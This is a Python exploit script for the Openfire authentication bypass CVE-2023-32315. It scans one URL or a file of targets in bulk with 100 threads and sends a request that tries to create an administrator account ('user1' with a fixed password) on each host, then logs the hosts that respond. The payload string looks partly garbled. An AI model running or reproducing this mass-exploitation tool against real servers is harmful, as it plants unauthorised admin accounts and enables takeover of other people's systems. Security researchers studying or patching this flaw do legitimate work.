#Openfire身份认证绕过漏洞(CVE-2023-32315)
#导包外置
import requests,argparse,sys
from multiprocessing.dummy import Pool
# 关闭告警
requests.packages.urllib3.disable_warnings()

def banner():
    test = """      o__ __o     o              o    o__ __o__/_              __o           o__ __o          __o         o__ __o                 o__ __o        __o         o__ __o     __o     o__ __o__/_  
     /v     v\   <|>            <|>  <|    v                 o/  v\         /v     v\       o/  v\       /v     v\               /v     v\     o/  v\       /v     v\    __|>   <|    v       
    />       <\  < >            < >  < >                    /|    <\       />       <\     /|    <\     />       <\             />       <\   /|    <\     />       <\     |    < >           
  o/              \o            o/    |                     //    o/     o/           \o   //    o/              o/                      o/   //    o/              o/    <o>   _\o____       
 <|                v\          /v     o__/_        _\__o__       /v     <|             |>       /v             _<|    _\__o__          _<|         /v             _<|      |         \_\__o__ 
  \\                <\        />      |                 \       />       \\           //       />                 \        \              \       />                 \    < >              \  
    \         /       \o    o/       <o>                      o/           \         /       o/        \          /            \          /     o/        \          /     |     \         /  
     o       o         v\  /v         |                      /v             o       o       /v           o       o               o       o     /v           o       o      o      o       o   
     <\__ __/>          <\/>         / \  _\o__/_           /> __o__/_      <\__ __/>      /> __o__/_    <\__ __/>               <\__ __/>    /> __o__/_    <\__ __/>    __|>_    <\__ __/>                                                                                                                                                                                                                                                                                    
                                                                                                                                                                            author :CHKer
                                                                                                                                                                            version:1.0.0
  """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="Openfire身份认证绕过漏洞(CVE-2023-32315)")
    parser.add_argument('-u', '--url', dest='url', type=str, help=' input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = "/user-create.jsp?csrf=Sio3WOA89y2L9Rl&username=user1&name=&email=&password=Qwer1234&passwordConfirm=Qwer1234&isadmin=on&create=............"
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res1 = requests.get(url=target+payload,timeout=10,verify=False,proxies=proxies)
        if res1.status_code == 200:
            print(f"[+]该url:{target}存在漏洞")
            with open('result56.txt','a', encoding='utf-8') as fp:
                fp.write(f"{target}"+"\n")
        else:
            print(f'[-]该url:{target}不存在漏洞')
    except:
        print(f'[-]该url:{target}该站点存在问题')

if __name__ == '__main__':
    main()